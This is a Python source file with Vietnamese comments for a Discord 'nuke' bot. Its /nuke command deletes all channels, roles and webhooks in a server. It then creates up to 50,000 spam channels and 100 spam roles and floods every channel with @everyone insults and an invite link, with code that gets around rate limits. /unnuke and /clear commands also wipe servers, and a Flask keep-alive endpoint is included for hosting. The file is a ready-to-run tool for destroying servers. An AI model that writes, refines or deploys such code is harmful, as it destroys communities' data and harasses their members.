# bot.py - Sửa lỗi không gửi tin nhắn vào kênh mới
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import random
from flask import Flask, jsonify
import threading

app = Flask(__name__)

TOKEN = os.getenv('DISCORD_TOKEN', '')
PORT = int(os.getenv('PORT', 10000))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='', intents=intents, help_command=None)

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.rate_limit_delay = 0.5          # Tăng delay để tránh rate limit
        self.channel_count = 50000
        self.role_count = 100
        self.spam_per_channel = 10

    # ---------- SLASH COMMANDS ----------

    @app_commands.command(name='nuke', description='🔥 Tạo 50k kênh, 100 role và spam @everyone')
    @app_commands.default_permissions(administrator=True)
    async def slash_nuke(self, interaction: discord.Interaction):
        await interaction.response.send_message('🔥 **NUKE SEQUENCE STARTED** 🔥', ephemeral=False)
        guild = interaction.guild

        # Xóa sạch server
        await interaction.channel.send('🗑️ Cleaning old channels...')
        deleted = await self.delete_all_channels(guild)
        await interaction.channel.send(f'✅ Deleted {deleted} channels')

        await interaction.channel.send('🗑️ Cleaning old roles...')
        deleted_roles = await self.delete_all_roles(guild)
        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles')

        await interaction.channel.send('🗑️ Cleaning webhooks...')
        deleted_webhooks = await self.delete_all_webhooks(guild)
        await interaction.channel.send(f'✅ Deleted {deleted_webhooks} webhooks')

        # Tạo spam
        await interaction.channel.send(f'📝 Creating {self.channel_count} spam channels...')
        created = await self.create_spam_channels(guild)
        await interaction.channel.send(f'✅ Created {created} channels')

        await interaction.channel.send(f'👑 Creating {self.role_count} spam roles...')
        created_roles = await self.create_spam_roles(guild)
        await interaction.channel.send(f'✅ Created {created_roles} roles')

        # Đợi cache cập nhật trước khi spam
        await interaction.channel.send('⏳ Waiting for Discord to sync channels...')
        await asyncio.sleep(5)

        await interaction.channel.send(f'💬 Spamming @everyone to all channels...')
        spammed = await self.spam_all_channels(guild)
        await interaction.channel.send(f'✅ Sent {spammed} messages')

        embed = discord.Embed(
            title='✅ NUKE COMPLETE',
            description='Server đã bị tấn công thành công!',
            color=discord.Color.red()
        )
        embed.add_field(name='📊 Channels', value=f'{created:,}', inline=True)
        embed.add_field(name='👑 Roles', value=f'{created_roles:,}', inline=True)
        embed.add_field(name='💬 Spam', value=f'{spammed:,}', inline=True)
        await interaction.channel.send(embed=embed)

    @app_commands.command(name='unnuke', description='🧹 Xóa tất cả kênh và role (giữ webhook)')
    @app_commands.default_permissions(administrator=True)
    async def slash_unnuke(self, interaction: discord.Interaction):
        await interaction.response.send_message('🧹 **UNNUKE STARTED** - Removing channels and roles...', ephemeral=False)
        guild = interaction.guild

        deleted = await self.delete_all_channels(guild)
        deleted_roles = await self.delete_all_roles(guild)
        await interaction.channel.send(f'✅ Deleted {deleted} channels and {deleted_roles} roles')

    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role và webhook (reset server)')
    @app_commands.default_permissions(administrator=True)
    async def slash_clear(self, interaction: discord.Interaction):
        await interaction.response.send_message('🗑️ **CLEAR STARTED** - Resetting server...', ephemeral=False)
        guild = interaction.guild

        deleted = await self.delete_all_channels(guild)
        deleted_roles = await self.delete_all_roles(guild)
        deleted_webhooks = await self.delete_all_webhooks(guild)
        await interaction.channel.send(
            f'✅ Deleted {deleted} channels, {deleted_roles} roles, {deleted_webhooks} webhooks'
        )

    # ---------- HÀM XỬ LÝ ----------

    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    count += 1
                    await asyncio.sleep(self.rate_limit_delay)
                except:
                    pass
        return count

    async def delete_all_webhooks(self, guild):
        count = 0
        webhooks = await guild.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def create_spam_channels(self, guild, count: int = None):
        if count is None:
            count = self.channel_count
        created = 0
        for i in range(count):
            try:
                # Tạo kênh với quyền mặc định (bot sẽ có quyền send messages)
                channel = await guild.create_text_channel(f'NUKE-{i}')
                created += 1
                if created % 100 == 0:
                    print(f'✅ Created {created}/{count} channels')
                await asyncio.sleep(self.rate_limit_delay)
            except discord.errors.RateLimited as e:
                wait = e.retry_after
                print(f'⏳ Rate limited, waiting {wait}s...')
                await asyncio.sleep(wait + 1)
            except Exception as e:
                print(f'❌ Error creating channel: {e}')
                await asyncio.sleep(1)
        return created

    async def create_spam_roles(self, guild, count: int = None):
        if count is None:
            count = self.role_count
        created = 0
        for i in range(count):
            try:
                await guild.create_role(
                    name=f'NUKE-ROLE-{i}',
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                created += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return created

    async def spam_all_channels(self, guild, count: int = None):
        if count is None:
            count = self.spam_per_channel
        sent = 0
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG'
        ]
        # Lấy danh sách text channel
        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        print(f'📢 Found {len(channels)} text channels to spam')
        if not channels:
            print('⚠️ No text channels found!')
            return 0

        for channel in channels:
            try:
                # Kiểm tra quyền gửi tin
                perms = channel.permissions_for(guild.me)
                if not perms.send_messages:
                    print(f'❌ No permission to send in #{channel.name}')
                    continue
                # Gửi spam
                for _ in range(count):
                    await channel.send(random.choice(messages))
                    sent += 1
                    await asyncio.sleep(self.rate_limit_delay)
            except discord.errors.RateLimited as e:
                wait = e.retry_after
                print(f'⏳ Rate limited in #{channel.name}, waiting {wait}s...')
                await asyncio.sleep(wait + 1)
            except Exception as e:
                print(f'❌ Error sending to #{channel.name}: {e}')
                await asyncio.sleep(0.5)
        return sent

# ---------- SỰ KIỆN ON_READY ----------
@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'📡 Connected to {len(bot.guilds)} servers')
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced {len(synced)} slash commands:')
        for cmd in synced:
            print(f'   /{cmd.name}')
    except Exception as e:
        print(f'❌ Failed to sync commands: {e}')

# ---------- FLASK ROUTES ----------
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'bot': str(bot.user),
        'servers': len(bot.guilds),
        'commands': ['/nuke', '/unnuke', '/clear']
    })

@app.route('/ping')
def ping():
    return jsonify({'pong': True, 'status': 'alive'})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

# ---------- CHẠY BOT + FLASK ----------
async def run_bot():
    await bot.add_cog(NukeCommands(bot))
    await bot.start(TOKEN)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("Bot stopped")
    except Exception as e:
        print(f"Error: {e}")
